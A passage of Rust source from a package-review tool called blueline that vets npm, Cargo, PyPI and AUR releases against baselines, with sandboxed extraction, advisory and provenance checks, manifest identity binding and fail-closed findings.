use std::io::{IsTerminal, Write};

use crate::baseline::{BaselineSelection, resolve_baseline};
use crate::cli::{Output, OutputFormat, RegistryBases};
use crate::diff::compute_delta;
use crate::heuristic::evaluate_with_trust;
use crate::install_ref::InstallRef;
use crate::manifest::{read_aur_srcinfo, read_package_json, read_packed_cargo_toml};
use crate::policy::Policy;
use crate::recursive::ReviewContext;
use crate::registry::{Checksum, Ecosystem, Registry};
use crate::render::{render_json, render_text};
use crate::store::BaselineStore;
use crate::version::VersionInfo;

/// A registry-predecessor baseline that was fetched, verified, and
/// diffed during this review but has never been approved locally.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UnreviewedBaseline {
    pub version: String,
    pub checksum: Checksum,
}

pub(crate) fn ctxless_registry(
    ecosystem: Ecosystem,
    bases: &RegistryBases,
) -> anyhow::Result<std::rc::Rc<dyn Registry>> {
    Ok(crate::recursive::registry_for(
        ecosystem,
        bases.for_ecosystem(ecosystem),
    ))
}

/// Evaluates a package specification against its baseline, computing delta,
/// OSV advisories, and Sigstore provenance to produce a final Verdict and
/// Delta, plus the recursive review of any install references the payload
/// carries.
pub fn evaluate_package(
    name: &str,
    version_str: &str,
    ecosystem: Ecosystem,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    ctx.enter_scope(ecosystem, name, version_str, true);
    let result = evaluate_scoped(name, version_str, ecosystem, store, policy, ctx);
    ctx.exit_scope();
    result
}

pub(crate) fn evaluate_scoped(
    name: &str,
    version_str: &str,
    ecosystem: Ecosystem,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    let registry = ctx.registry(ecosystem);
    match ecosystem {
        Ecosystem::Npm => evaluate_with_registry::<semver::Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::Cargo => evaluate_with_registry::<semver::Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::PyPi => evaluate_with_registry::<crate::version::Pep440Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::Aur => evaluate_with_registry::<crate::version::AurVersionInfo>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
    }
}

fn evaluate_with_registry<V: VersionInfo>(
    registry: &dyn Registry,
    name: &str,
    version_str: &str,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    let target_ver = V::parse(version_str)
        .map_err(|e| anyhow::anyhow!("invalid version for `{version_str}`: {e}"))?;

    let ecosystem = registry.ecosystem();
    // AUR review bytes are built by `git clone` and `git archive` running as
    // ordinary subprocesses of this process, and neither can be confined:
    // Landlock has no say over the network, and a clone writes to its own
    // working tree by design. The extraction step that follows is still
    // confined by `src/sandbox.rs`, but the parent's own `git` parses the
    // attacker-chosen objects first and is the larger of the two parsers. An
    // operator who set `require_sandbox` asked for a refusal rather than a
    // disclosure, so that is what the AUR lane gets: a key that cannot deliver
    // what it promises, silently, is the same fail-open as a key in a table
    // nothing reads.
    if ecosystem == Ecosystem::Aur && policy.policy.require_sandbox {
        return Err(anyhow::anyhow!(
            "AUR@{}@{}: `[policy] require_sandbox = true` cannot be honoured, because the \
             review bytes are produced by `git clone` and `git archive` outside the \
             Landlock domain by construction. Unset the key to review this package with a \
             disclosed gap instead of a refusal.",
            name,
            version_str
        ));
    }
    let registry_base = ctx.bases.for_ecosystem(ecosystem).to_string();
    let target_pkg = registry.resolve(name, version_str)?;

    let target_tarball = ctx.fetch_tarball(registry, &target_pkg)?;

    let checksum = target_pkg.integrity.clone().ok_or_else(|| {
        anyhow::anyhow!(
            "{}@{}: registry provided no content checksum; refusing to trust unverifiable bytes",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    let target_temp = crate::extract::private_temp_dir()
        .map_err(|e| anyhow::anyhow!("creating temp dir: {e}"))?;
    extract_for_ecosystem(
        &target_tarball,
        target_temp.path(),
        ecosystem,
        &target_pkg.tarball_url,
        &mut ctx.sandbox,
        policy,
    )
    .map_err(|e| {
        anyhow::anyhow!(
            "failed to extract {}@{}: {e}",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    let (target_root, target_manifest) = prepare_extracted_root(
        target_temp.path(),
        ecosystem,
        &target_pkg.name,
        &target_pkg.version,
    )
    .map_err(|e| {
        anyhow::anyhow!(
            "invalid extracted contents for {}@{}: {e}",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    store.record_verified(ecosystem, &target_pkg.name, &target_pkg.version, &checksum)?;

    let baseline_res: BaselineSelection =
        resolve_baseline(&target_pkg.name, &target_ver, registry, store)
            .map_err(|e| anyhow::anyhow!("baseline resolution: {e}"))?;

    let (delta, base_pkgbuild) = if let Some(base_pkg) = baseline_res.resolution.package() {
        let base_tarball = ctx.fetch_tarball(registry, base_pkg)?;
        let base_temp = crate::extract::private_temp_dir()
            .map_err(|e| anyhow::anyhow!("creating temp dir: {e}"))?;
        extract_for_ecosystem(
            &base_tarball,
            base_temp.path(),
            ecosystem,
            &base_pkg.tarball_url,
            &mut ctx.sandbox,
            policy,
        )
        .map_err(|e| {
            anyhow::anyhow!(
                "failed to extract baseline {}@{}: {e}",
                base_pkg.name,
                base_pkg.version
            )
        })?;
        let (base_root, base_manifest) = prepare_extracted_root(
            base_temp.path(),
            ecosystem,
            &base_pkg.name,
            &base_pkg.version,
        )
        .map_err(|e| {
            anyhow::anyhow!(
                "invalid extracted contents for baseline {}@{}: {e}",
                base_pkg.name,
                base_pkg.version
            )
        })?;

        let delta = compute_delta(
            Some(&base_root),
            Some(&base_manifest),
            Some(&base_pkg.version),
            &target_root,
            &target_manifest,
            &target_pkg.version,
        )?;
        let base_pkgbuild = if ecosystem == Ecosystem::Aur {
            match std::fs::read_to_string(base_root.join("PKGBUILD")) {
                Ok(text) => Some(text),
                Err(_) => Some(String::new()),
            }
        } else {
            None
        };
        (delta, base_pkgbuild)
    } else {
        (
            compute_delta(
                None,
                None,
                None,
                &target_root,
                &target_manifest,
                &target_pkg.version,
            )?,
            None,
        )
    };

    let is_unreviewed = matches!(
        baseline_res.resolution,
        crate::baseline::BaselineResolution::RegistryPredecessor(_)
    );

    let unreviewed_baseline = match baseline_res.resolution.package() {
        Some(pkg) if is_unreviewed => pkg.integrity.clone().map(|checksum| UnreviewedBaseline {
            version: pkg.version.clone(),
            checksum,
        }),
        _ => None,
    };

    // The error is kept rather than collapsed into the report. An operator who
    // set `fail_closed_network` asked for exactly this to stop the review, and
    // as an `unverified` report it produced no finding at all, so the verdict
    // came out the same as a clean advisory pass. It becomes a finding below.
    //
    // The `Ok` arm needed the same treatment for the case where policy does NOT
    // fail closed. `fetch_advisories` returns `Ok(unverified(..))` when the
    // lookup could not complete but the operator asked for the review to carry
    // on -- and that arm set no error at all, so a network failure and a clean
    // advisory pass reached the verdict identically. Nothing downstream could
    // tell them apart: the only reader of the status was a colour label on the
    // interactive card, and the CI text and markdown summaries, the JSON verdict
    // and every MCP response reported the same thing for both. A lockfile diff
    // adding one already-baselined package therefore printed `Status: PASSED`
    // and exited 0 with the advisory host down.
    //
    // The two cases are not the same severity. An `Err` is a real failure and
    // stays HIGH. An `unverified` report the operator has already accepted is a
    // coverage hole worth saying out loud, not worth blocking on -- so it is a
    // MEDIUM disclosure that escalates for anyone running a stricter
    // `fail_on`. Advisory checking switched off in policy is the operator's
    // deliberate choice and is not a coverage hole, so it stays silent.
    let (advisories, advisory_error, advisory_coverage_unknown) =
        match crate::advisory::fetch_advisories(
            &target_pkg.name,
            &target_pkg.version,
            ecosystem,
            Some(store),
            policy,
        ) {
            Ok(report) => {
                let unknown = crate::advisory::coverage_unknown(&report, policy);
                (report, None, unknown)
            }
            Err(e) => (
                crate::advisory::AdvisoryReport::unverified(&e.to_string()),
                Some(e.to_string()),
                None,
            ),
        };

    let provenance = match ecosystem {
        Ecosystem::Npm => Some(crate::provenance::inspect_provenance(
            &target_pkg.name,
            &target_pkg.version,
            &checksum,
            registry.release_signatures(&target_pkg).as_ref(),
            &registry_base,
            Some(store),
            policy,
        )),
        Ecosystem::PyPi => {
            let raw_name = target_pkg
                .tarball_url
                .rsplit('/')
                .next()
                .unwrap_or(&target_pkg.name);
            let filename = raw_name.split(&['?', '#'][..]).next().unwrap_or(raw_name);
            Some(crate::provenance::inspect_provenance_pypi(
                &target_pkg.name,
                &target_pkg.version,
                filename,
                &checksum,
                &registry_base,
                Some(store),
                policy,
            ))
        }
        Ecosystem::Cargo => None,
        Ecosystem::Aur => None,
    };

    let target_author = registry.release_author(&target_pkg);
    let author_changed = {
        let baseline_author = baseline_res
            .resolution
            .package()
            .and_then(|p| registry.release_author(p));
        // Unknown authorship on either side is "no signal", never a finding.
        matches!(
            (baseline_author, target_author.clone()),
            (Some(base), Some(target)) if base != target
        )
    };

    let mut verdict = evaluate_with_trust(
        &target_pkg.name,
        ecosystem,
        &checksum.to_display(),
        &delta,
        is_unreviewed,
        baseline_res.prior_release_yanked,
        baseline_res.prior_yanked_reason.as_deref(),
        baseline_res.target_release_yanked,
        baseline_res.target_yanked_reason.as_deref(),
        author_changed,
        target_author.as_deref(),
        policy,
        Some(&advisories),
        provenance.as_ref(),
    );

    // An unconfined extraction is disclosed per review, never silently absorbed.
    // Pushed rather than routed through `apply_extra_findings`, on purpose: that
    // helper recomputes the band from the accumulated score, and this finding
    // must not touch the band at all. A direct push cannot, by construction, so
    // the invariant does not depend on a severity a future edit could change.
    // `ci.rs` already pushes `R10_LOCKFILE_HASH_MISMATCH` the same way, so this
    // is an existing idiom rather than a new one.
    if let Some(disclosure) = ctx.sandbox.disclosure() {
        verdict.findings.push(disclosure);
    }

    if ecosystem == Ecosystem::Aur {
        if matches!(base_pkgbuild.as_deref(), Some("")) {
            verdict.findings.push(baseline_unreadable_finding());
        }
        // `None` is first sighting (no baseline package); `Some("")` is an
        // unreadable baseline file, already surfaced above. Both skip pair
        // rules; anything else diffs.
        let base_text = match base_pkgbuild.as_deref() {
            None | Some("") => None,
            Some(text) => Some(text),
        };
        let extra = crate::pkgbuild::review_roots(&target_root, base_text, &delta);
        crate::heuristic::apply_extra_findings(&mut verdict, extra, policy);
    }

    // Recall-index staleness (R28): a synced snapshot older than the
    // policy window is disclosed; an unreadable one is disclosed at
    // HIGH — a blind revocation index is a coverage hole, never silence.
    match crate::recall::stale_band(policy) {
        Ok(Some(band)) => {
            let finding = crate::verdict::Finding {
                rule_id: "R28_RECALL_STALE".to_string(),
                severity: band,
                title: "Recall index stale".to_string(),
                description: format!(
                    "the synced revocation index is older than the policy window                      ({}h); revocation coverage is not current",
                    policy.recall.max_age_hours
                ),
            };
            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
        }
        Ok(None) => {}
        Err(e) => {
            let finding = crate::verdict::Finding {
                rule_id: "R28_RECALL_STALE".to_string(),
                severity: crate::verdict::VerdictBand::High,
                title: "Recall index unreadable".to_string(),
                description: format!("the synced revocation index could not be read: {e:#}"),
            };
            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
        }
    }

    if let Some(detail) = advisory_error {
        let finding = crate::verdict::Finding {
            rule_id: "R09_ADVISORY_UNVERIFIED".to_string(),
            severity: crate::verdict::VerdictBand::High,
            title: "Advisory source unavailable".to_string(),
            description: format!(
                "the advisory lookup failed and policy is configured to fail closed, so \
                 revocation coverage for this release is unknown: {detail}"
            ),
        };
        crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
    }

    if let Some(detail) = advisory_coverage_unknown {
        let finding = crate::verdict::Finding {
            rule_id: "R09_ADVISORY_UNVERIFIED".to_string(),
            severity: crate::verdict::VerdictBand::Medium,
            title: "Advisory coverage unknown".to_string(),
            description: format!(
                "the advisory lookup did not complete and policy is configured to continue \
                 anyway, so this release's revocation coverage is unknown rather than clear: \
                 {detail}"
            ),
        };
        crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
    }

    // Recursive review pass: every install reference the payload carries
    // is disclosed (R24), then piped through the same review engine with
    // depth/cycle/budget caps failing closed (R25/R26), and child findings
    // at or above the policy band roll up into this verdict (R27).
    let (mut refs, target_disclosure) =
        collect_install_refs(ecosystem, &target_root, &target_manifest, &delta);
    let mut ref_findings = crate::recursive::install_ref_findings(&refs);
    if let Some(finding) = target_disclosure {
        ref_findings.push(finding);
    }
    if refs.len() > MAX_INSTALL_REFS {
        let total = refs.len();
        refs.truncate(MAX_INSTALL_REFS);
        ref_findings.push(crate::verdict::Finding {
            rule_id: "R24_LIFECYCLE_INSTALL_REF".to_string(),
            severity: crate::verdict::VerdictBand::High,
            title: "Install-reference cap exceeded".to_string(),
            description: format!(
                "{total} install references found; only the first {MAX_INSTALL_REFS} are \
                 reviewed recursively and the rest are NOT reviewed — fail closed"
            ),
        });
    }
    if !ref_findings.is_empty() {
        crate::heuristic::apply_extra_findings(&mut verdict, ref_findings, policy);
    }
    if !refs.is_empty() {
        let (children, mut rollup) = ctx.review_children(&refs, store, policy);
        for child in &children {
            if child.band >= ctx.child_block_band() {
                rollup.push(crate::recursive::second_order_finding(child));
            }
        }
        verdict.recursive = children;
        if !rollup.is_empty() {
            crate::heuristic::apply_extra_findings(&mut verdict, rollup, policy);
        }
    }

    Ok((verdict, delta, checksum, unreviewed_baseline))
}

/// Cap on install references reviewed recursively per package: a hostile
/// payload naming thousands of references must not multiply the review
/// fan-out. The overflow is disclosed fail closed at the call site.
const MAX_INSTALL_REFS: usize = 32;

/// Install references in the reviewed payload, per ecosystem: npm manifest
/// lifecycle scripts, AUR PKGBUILD npm/bun delivery, PyPI wheel
/// `.data/scripts`. Cargo `build.rs` can shell out but has no structured
/// install-reference grammar to extract statically in v1 — the cargo lane
/// is disclosed by the existing build-code findings.
fn collect_install_refs(
    ecosystem: Ecosystem,
    target_root: &std::path::Path,
    target_manifest: &crate::manifest::PackageJson,
    delta: &crate::diff::Delta,
) -> (Vec<InstallRef>, Option<crate::verdict::Finding>) {
    match ecosystem {
        Ecosystem::Npm => (
            crate::install_ref::from_npm_lifecycle(target_manifest),
            None,
        ),
        Ecosystem::PyPi => (
            crate::install_ref::from_wheel_data_scripts(target_root, delta),
            None,
        ),
        Ecosystem::Aur => match std::fs::read_to_string(target_root.join("PKGBUILD")) {
            Ok(text) => (crate::pkgbuild::npm_delivery_refs(&text), None),
            Err(e) => (Vec::new(), Some(target_unreadable_finding(&e.to_string()))),
        },
        Ecosystem::Cargo => (Vec::new(), None),
    }
}

/// Every location a PyPI artifact's core metadata can legitimately sit at. PEP
/// 427 puts a wheel's at `<name>-<version>.dist-info/METADATA`, `.egg-info`
/// predates it, and an sdist carries `PKG-INFO` at the root of its single
/// top-level directory.
///
/// All of them are returned rather than the first. `pip` installs the metadata
/// that belongs to the distribution, so an archive carrying two leaves the
/// choice of which one the review reads, and which one the installer reads, up
/// to whoever built the archive. The caller refuses on anything but exactly one.
fn pypi_metadata_candidates(root: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut found: Vec<std::path::PathBuf> = [root.join("METADATA"), root.join("PKG-INFO")]
        .into_iter()
        .filter(|path| path.is_file())
        .collect();
    // One level down, which is where a wheel's dist-info and an sdist's single
    // top-level directory both put it.
    if let Ok(entries) = std::fs::read_dir(root) {
        found.extend(
            entries
                .flatten()
                .filter(|entry| entry.path().is_dir())
                .flat_map(|entry| {
                    let dir = entry.path();
                    [dir.join("METADATA"), dir.join("PKG-INFO")]
                })
                .filter(|path| path.is_file()),
        );
    }
    found.sort();
    found.dedup();
    found
}

/// The fields of core metadata this review binds to, read strictly. A field the
/// artifact does not carry is `None`, never a default: every use of it below is
/// a comparison against what the registry resolved, and a synthesized value
/// compares equal to itself by construction.
struct PypiCoreMetadata {
    name: Option<String>,
    version: Option<String>,
    dependencies: std::collections::BTreeMap<String, String>,
}

fn parse_pypi_core_metadata(raw: &str) -> PypiCoreMetadata {
    let mut parsed = PypiCoreMetadata {
        name: None,
        version: None,
        dependencies: std::collections::BTreeMap::new(),
    };
    for line in raw.lines() {
        if let Some(rest) = line.strip_prefix("Requires-Dist:") {
            let dep = rest.trim().split(';').next().unwrap_or("").trim();
            if !dep.is_empty() {
                let name = dep.split_whitespace().next().unwrap_or(dep).to_string();
                parsed.dependencies.insert(name, dep.to_string());
            }
        } else if parsed.name.is_none()
            && let Some(rest) = line.strip_prefix("Name:")
        {
            let value = rest.trim();
            if !value.is_empty() {
                parsed.name = Some(value.to_string());
            }
        } else if parsed.version.is_none()
            && let Some(rest) = line.strip_prefix("Version:")
        {
            let value = rest.trim();
            if !value.is_empty() {
                parsed.version = Some(value.to_string());
            }
        }
    }
    parsed
}

/// Extract one archive under the OS-level sandbox, or disclose there was none.
///
/// The routing decision stays here, where the ecosystem and the tarball URL are
/// already known, so the child never re-derives a decision from bytes it would
/// otherwise have to parse. `ExtractionLimits::default()` is applied inside
/// `sandbox`, so the confined child and the in-process fallback cannot drift
/// apart on how much an archive is allowed to cost.
fn extract_for_ecosystem(
    tarball: &[u8],
    dest: &std::path::Path,
    ecosystem: Ecosystem,
    tarball_url: &str,
    ledger: &mut crate::sandbox::SandboxLedger,
    policy: &Policy,
) -> Result<crate::extract::ExtractStats, crate::error::BluelineError> {
    let kind = if ecosystem == Ecosystem::PyPi && tarball_url.ends_with(".whl") {
        crate::sandbox::ArchiveKind::Wheel
    } else {
        crate::sandbox::ArchiveKind::Tar
    };
    crate::sandbox::extract(kind, tarball, dest, ledger, policy)
}

/// Locate and parse the package manifest inside an extracted release tree.
/// Cargo `.crate` archives additionally must unpack to exactly one top-level
/// directory named `{canonical-name}-{version}`; AUR archives are the repo
/// root itself (PKGBUILD + .SRCINFO + patches, no pkgbase subdirectory).
fn prepare_extracted_root(
    temp_root: &std::path::Path,
    ecosystem: Ecosystem,
    canonical_name: &str,
    version: &str,
) -> Result<(std::path::PathBuf, crate::manifest::PackageJson), crate::error::BluelineError> {
    let root = match ecosystem {
        Ecosystem::Cargo => {
            crate::registry::cratesio::verify_single_root(temp_root, canonical_name, version)?
        }
        _ => temp_root.to_path_buf(),
    };
    let manifest = match ecosystem {
        Ecosystem::Npm => read_package_json(&package_json_path(&root))?,
        Ecosystem::Cargo => read_packed_cargo_toml(&root.join("Cargo.toml"))?.manifest_view(),
        Ecosystem::Aur => {
            for required in ["PKGBUILD", ".SRCINFO"] {
                if !root.join(required).is_file() {
                    return Err(crate::error::BluelineError::Manifest(
                        canonical_name.to_string(),
                        format!(
                            "AUR archive is missing `{required}` at its root; refusing to review"
                        ),
                    ));
                }
            }
            let manifest = read_aur_srcinfo(&root.join(".SRCINFO"))?;
            if manifest.name != canonical_name {
                return Err(crate::error::BluelineError::Manifest(
                    canonical_name.to_string(),
                    format!(
                        "AUR archive declares pkgbase `{}` but the review resolved `{canonical_name}`; refusing to review",
                        manifest.name
                    ),
                ));
            }
            manifest
        }
        Ecosystem::PyPi => {
            // A wheel keeps its metadata at `<name>-<version>.dist-info/METADATA`
            // (or `.egg-info`), and an sdist at `PKG-INFO` under a single
            // top-level directory. The old code read `root.join("METADATA")`
            // with no descent, which never exists for either artifact type, so
            // the read silently failed and PyPI dependencies were always empty:
            // R04_DEPENDENCY_ADDED and R04_DEPENDENCY_MODIFIED could not fire on
            // a wheel or an sdist at all.
            //
            // Every way that read could come back empty or unusable is now a
            // refusal rather than a fallback. The arm used to synthesize the
            // name from the resolved name and the version from the requested
            // version, and the archive-identity guard below then compared each
            // against itself, so it could not fire on either fallback path: a
            // wheel with no metadata, with a non-UTF-8 one, with a decoy
            // metadata directory sorting ahead of the real one, or with a
            // `Version:` contradicting the resolved version, was reviewed as a
            // confident zero-dependency package under the resolved name while
            // the installed bytes were the attacker's.
            let refuse = |detail: String| {
                crate::error::BluelineError::Manifest(
                    canonical_name.to_string(),
                    format!("{detail}; refusing to review"),
                )
            };
            let candidates = pypi_metadata_candidates(&root);
            let [meta] = candidates.as_slice() else {
                return Err(if candidates.is_empty() {
                    refuse(
                        "archive carries no core metadata (no METADATA or PKG-INFO at its \
                         root or one level down)"
                            .to_string(),
                    )
                } else {
                    refuse(format!(
                        "archive carries {} core metadata files ({}); the installed \
                         distribution is not determined by the archive alone",
                        candidates.len(),
                        candidates
                            .iter()
                            .map(|p| { p.strip_prefix(&root).unwrap_or(p).display().to_string() })
                            .collect::<Vec<_>>()
                            .join(", ")
                    ))
                });
            };
            let raw = std::fs::read_to_string(meta).map_err(|e| {
                refuse(format!(
                    "core metadata `{}` is unreadable: {e}",
                    meta.display()
                ))
            })?;
            let core = parse_pypi_core_metadata(&raw);

            let declared_name = core.name.ok_or_else(|| {
                refuse(format!(
                    "core metadata `{}` declares no name",
                    meta.display()
                ))
            })?;
            let declared_version = core.version.ok_or_else(|| {
                refuse(format!(
                    "core metadata `{}` declares no version",
                    meta.display()
                ))
            })?;
            // The version the registry resolved is the one the baseline, the
            // allowlist and every downstream rule key on. A metadata that
            // declares a different one is a package whose contents are not the
            // release under review.
            let parsed_declared = crate::version::Pep440Version::parse(&declared_version)
                .map_err(|e| refuse(format!("declared version `{declared_version}`: {e}")))?;
            let resolved = crate::version::Pep440Version::parse(version)
                .map_err(|e| refuse(format!("resolved version `{version}`: {e}")))?;
            if parsed_declared != resolved {
                return Err(refuse(format!(
                    "core metadata declares version `{declared_version}` but the review \
                     resolved `{version}`"
                )));
            }
            crate::manifest::PackageJson {
                name: declared_name,
                version: declared_version,
                dependencies: core.dependencies,
                ..Default::default()
            }
        }
    };
    // Every lane that parses a manifest from the archive must bind the name it
    // declares to the name the registry resolved. `package_json_path` resolves
    // through `find_package_prefix`, which descends into a single top-level
    // directory, so a tarball rooted at `evil/` was read as `evil/package.json`
    // and its declared name discarded. The allowlist, blocklist and baseline
    // key are all evaluated against the resolved name while the installed
    // bytes are the attacker's, which defeats exact-match allowlisting for a
    // package that lies about its own identity.
    // PyPI is compared under PEP 503 normalisation rather than by string
    // equality: `Foo.Bar`, `foo-bar`, `foo_bar` and `foo.bar` are one project,
    // and an honest wheel carries the raw name in METADATA while its filename
    // carries the escaped one. A plain `!=` would refuse legitimate releases,
    // which in a fail-closed tool is its own damage.
    let name_matches = if ecosystem == Ecosystem::PyPi {
        crate::version::canonicalize_name(&manifest.name)
            == crate::version::canonicalize_name(canonical_name)
    } else {
        manifest.name == canonical_name
    };
    if !name_matches {
        return Err(crate::error::BluelineError::Manifest(
            canonical_name.to_string(),
            format!(
                "archive manifest declares `{}` but the review resolved `{canonical_name}`; refusing to review",
                manifest.name
            ),
        ));
    }
    if manifest.name.trim().is_empty() {
        return Err(crate::error::BluelineError::Manifest(
            canonical_name.to_string(),
            "archive manifest declares an empty name; refusing to review".to_string(),
        ));
    }
    Ok((root, manifest))
}

// Pair rules cannot run against a baseline whose PKGBUILD cannot be read,
// so the refusal itself must be loud: High, matching the unparseable case.
fn baseline_unreadable_finding() -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: "R00_BASELINE_UNREADABLE".to_string(),
        severity: crate::verdict::VerdictBand::High,
        title: "Baseline PKGBUILD unreadable".to_string(),
        description: "baseline PKGBUILD could not be read; pair rules skipped".to_string(),
    }
}

// The target PKGBUILD itself cannot be read (permissions, non-UTF-8):
// delivery references are unextractable, so the hole is disclosed at the
// same HIGH band rather than scanned as an empty file.
fn target_unreadable_finding(detail: &str) -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: "R00_BASELINE_UNREADABLE".to_string(),
        severity: crate::verdict::VerdictBand::High,
        title: "Target PKGBUILD unreadable".to_string(),
        description: format!(
            "target PKGBUILD could not be read ({detail}); delivery references unextractable"
        ),
    }
}

fn bootstrap_hint(verdict: &crate::verdict::Verdict) -> Option<String> {
    let name = &crate::render::sanitize_single_line(&verdict.name);
    if verdict
        .findings
        .iter()
        .any(|f| f.rule_id == "R07_UNREVIEWED_PREDECESSOR_BASELINE")
    {
        let base = &crate::render::sanitize_single_line(
            verdict.baseline_version.as_deref().unwrap_or("unknown"),
        );
        let other_risk = verdict.findings.iter().any(|f| {
            f.rule_id != "R07_UNREVIEWED_PREDECESSOR_BASELINE"
                && f.rule_id != "R06_FIRST_SIGHTING"
                && f.severity > crate::verdict::VerdictBand::Low
        });
        let remedy = if other_risk {
            "Address the findings above first; a baseline allowlist rule will not clear them."
                .to_string()
        } else {
            format!(
                "Run `blueline review {name}@{base}` to approve it, or add an [[allowlist.packages]] rule for this \
                 package with `allow_unreviewed_baseline = true` to blueline.toml. Walking the chain one version \
                 at a time works, but a package with a long release history needs one run per version back to the \
                 first."
            )
        };
        Some(format!(
            "hint: baseline `{name}@{base}` was never approved locally. {remedy}"
        ))
    } else if verdict
        .findings
        .iter()
        .any(|f| f.rule_id == "R06_FIRST_SIGHTING")
    {
        let other_risk = verdict.findings.iter().any(|f| {
            f.rule_id != "R06_FIRST_SIGHTING" && f.severity > crate::verdict::VerdictBand::Low
        });
        let remedy = if other_risk {
            "Address the findings above first; a baseline allowlist rule will not clear them."
        } else {
            "Approve it from an interactive terminal, or add an [[allowlist.packages]] rule with `allow_unreviewed_baseline = true` to blueline.toml to onboard it without one."
        };
        Some(format!(
            "hint: no approved baseline exists for `{name}`. {remedy}"
        ))
    } else {
        None
    }
}

pub fn run(
    pkg_spec: &str,
    ecosystem: Ecosystem,
    bases: &RegistryBases,
    output: Output,
    policy_path: Option<&std::path::Path>,
    yes: bool,
) -> anyhow::Result<()> {
    let policy = Policy::load_or_default(policy_path)?;
    let registry = ctxless_registry(ecosystem, bases)?;
    let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
    let store = BaselineStore::open()?;

    let mut ctx = ReviewContext::new(&policy, bases.clone());
    let (verdict, delta, checksum, unreviewed_baseline) =
        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;

    let format = output.resolve(std::io::stdout().is_terminal());
    match format {
        OutputFormat::Json => {
            render_json(&verdict)?;
        }
        OutputFormat::Text => {
            render_text(&verdict, &delta);
        }
    }

    if yes {
        if verdict.band == crate::verdict::VerdictBand::Low {
            store.mark_clean(ecosystem, &verdict.name, &verdict.target_version, &checksum)?;
            let _ = store.record_audit_log(
                ecosystem,
                &verdict.name,
                &verdict.target_version,
                &checksum.to_display(),
                "approve_auto_yes",
                0,
                "auto_approved_low_risk",
                "user",
                None,
            );
            if format != OutputFormat::Json {
                println!(
                    "Approved {}@{} and marked clean in baseline store (--yes).",
                    name, version_str
                );
            }
            return Ok(());
        } else {
            eprintln!(
                "Cannot auto-approve {}@{}: risk verdict is {} (score: {}). Refusing to proceed (--yes).",
                name, version_str, verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
            std::process::exit(2);
        }
    }

    if format != OutputFormat::Json
        && std::io::stdin().is_terminal()
        && std::io::stdout().is_terminal()
    {
        interactive_prompt(
            &store,
            ecosystem,
            &verdict.name,
            &verdict.target_version,
            &checksum,
            &delta,
            unreviewed_baseline.as_ref(),
        )?;
    } else if verdict.band != crate::verdict::VerdictBand::Low {
        if !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
            eprintln!(
                "Non-interactive terminal detected without `--yes`. Risk verdict is {} (score: {}). Refusing to proceed.",
                verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
        }
        std::process::exit(2);
    }

    Ok(())
}

pub fn install(
    pkg_spec: &str,
    ecosystem: Ecosystem,
    bases: &RegistryBases,
    npm_args: &[String],
    policy_path: Option<&std::path::Path>,
    yes: bool,
) -> anyhow::Result<()> {
    if ecosystem == Ecosystem::Cargo {
        eprintln!(
            "blueline install refuses cargo packages: building a crate executes its `build.rs` \
             script, which blueline cannot sandbox. Review it instead with \
             `blueline review <crate>@<version> --ecosystem cargo`."
        );
        std::process::exit(2);
    }
    if ecosystem == Ecosystem::PyPi {
        eprintln!(
            "blueline install refuses PyPI packages: installing a Python sdist executes arbitrary \
             build code and wheels may contain installer hooks; review it instead with \
             `blueline review <package>==<version> --ecosystem pypi`."
        );
        std::process::exit(2);
    }
    if ecosystem == Ecosystem::Aur {
        eprintln!(
            "blueline install refuses AUR packages: building a package executes its PKGBUILD \
             shell script, which blueline cannot sandbox. Review it instead with \
             `blueline review <package>@<version> --ecosystem aur`."
        );
        std::process::exit(2);
    }

    crate::executor::validate_extra_args(npm_args)?;
    let policy = Policy::load_or_default(policy_path)?;
    let registry = ctxless_registry(ecosystem, bases)?;
    let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
    let store = BaselineStore::open()?;

    let mut ctx = ReviewContext::new(&policy, bases.clone());
    let (verdict, delta, checksum, unreviewed_baseline) =
        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;
    render_text(&verdict, &delta);

    let is_interactive = std::io::stdin().is_terminal() && std::io::stdout().is_terminal();
    let approved = if yes {
        if verdict.band == crate::verdict::VerdictBand::Low {
            store.mark_clean(ecosystem, &verdict.name, &verdict.target_version, &checksum)?;
            let _ = store.record_audit_log(
                ecosystem,
                &verdict.name,
                &verdict.target_version,
                &checksum.to_display(),
                "approve_auto_yes",
                0,
                "auto_approved_low_risk",
                "user",
                None,
            );
            println!(
                "Approved {}@{} and marked clean in baseline store (--yes).",
                name, version_str
            );
            true
        } else {
